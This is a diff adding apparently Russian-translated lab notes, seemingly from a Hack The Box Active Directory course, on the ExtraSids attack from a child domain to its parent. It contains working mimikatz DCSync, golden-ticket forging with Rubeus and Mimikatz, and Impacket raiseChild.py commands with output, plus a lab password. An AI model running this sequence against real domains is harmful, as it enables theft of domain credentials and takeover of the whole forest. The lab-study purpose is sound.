@@ -274,6 +274,119 @@ hashcat (v6.1.1) starting...
         PowerShell-сессия 
 PS C:\Tools> .\Rubeus.exe asktgt /user:buster /domain:inlanefreight.ad /password:<SNIP> /ptt
 
+# Атака ЭкстраСидс
+Получите хэш KRBTGT для дочернего домена.
+
+        PowerShell-сессия 
+PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
+.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:DEV\krbtgt
+[DC] 'dev.INLANEFREIGHT.AD' will be the domain
+[DC] 'DC02.dev.INLANEFREIGHT.AD' will be the DC server
+[DC] 'DEV\krbtgt' will be the user account
+Object RDN           : krbtgt
+** SAM ACCOUNT **
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 5/15/2023 5:39:11 AM
+Object Security ID   : S-1-5-21-2901893446-2198612369-2488268720-502
+Object Relative ID   : 502
+Credentials:
+Hash NTLM: 992093609707726257e0959ce3e24771
+ntlm- 0: 992093609707726257e0959ce3e24771
+lm  - 0: 3491756dfc7414817b971dff2e4a7834
+<SNIP>
+
+
+Получите SID дочернего домена.
+
+        PowerShell-сессия 
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainSID
+S-1-5-21-2901893446-2198612369-2488268720
+
+Получите SID администраторов предприятия из родительского домена.
+
+        PowerShell-сессия 
+PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server "inlanefreight.ad"
+DistinguishedName : CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=AD
+GroupCategory     : Security
+GroupScope        : Universal
+Name              : Enterprise Admins
+ObjectClass       : group
+ObjectGUID        : caa39c09-cb6e-4021-936f-afabfa6af908
+SamAccountName    : Enterprise Admins
+SID               : S-1-5-21-2879935145-656083549-3766571964-519
+
+На данный момент мы собрали следующие данные:
+
+    Хэш KRBTGT для дочернего домена: 992093609707726257e0959ce3e24771
+    SID для дочернего домена: S-1-5-21-2901893446-2198612369-2488268720
+    Имя целевого пользователя в дочернем домене: мы выберем Administrator
+    Полное доменное имя (FQDN) дочернего домена: DEV.INLANEFREIGHT.AD
+    SID группы Enterprise Admins корневого домена: S-1-5-21-2879935145-656083549-3766571964-519
+
+Создание «золотого билета» с помощью Rubeus
+
+        PowerShell-сессия 
+PS C:\Tools> .\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt
+
+место RubeusМы также можем осуществить эту атаку и создать золотой билет, используя... MimikatzMimikatz предлагает еще один способ реализации ExtraSids attackи генерировать golden ticketsдля повышения привилегий.
+Создание золотого билета с помощью Mimikatz
+
+        команда 
+C:\Tools> mimikatz.exe
+.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # kerberos::golden /user:Administrator /domain:dev.inlanefreight.ad  /sid:S-1-5-21-2901893446-2198612369-2488268720 /krbtgt:992093609707726257e0959ce3e24771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt
+
+User      : Administrator
+Domain    : dev.inlanefreight.ad (DEV)
+SID       : S-1-5-21-2901893446-2198612369-2488268720
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-2879935145-656083549-3766571964-519 ;
+ServiceKey: 992093609707726257e0959ce3e24771 - rc4_hmac_nt
+Lifetime  : 3/20/2024 5:41:55 AM ; 3/18/2034 5:41:55 AM ; 3/18/2034 5:41:55 AM
+-> Ticket : ** Pass The Ticket **
+
+    * PAC generated
+    * PAC signed
+    * EncTicketPart generated
+    * EncTicketPart encrypted
+    * KrbCred generated
+
+Golden ticket for 'Administrator @ dev.inlanefreight.ad' successfully submitted for current session       
+
+олучите доступ к DC01
+
+        PowerShell-сессия 
+PS C:\Tools> ls \\DC01\c$\Users\Administrator\Desktop
+Directory: \\DC01\c$\Users\Administrator\Desktop
+
+
+Автоматизация атаки с помощью raiseChild.py 
+mxdelta@htb[/htb]$ proxychains raiseChild.py -target-exe 172.16.210.99 dev.inlanefreight.ad/htb-student
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+Password: HTB_@cademy_stdnt!
+
 
 
 
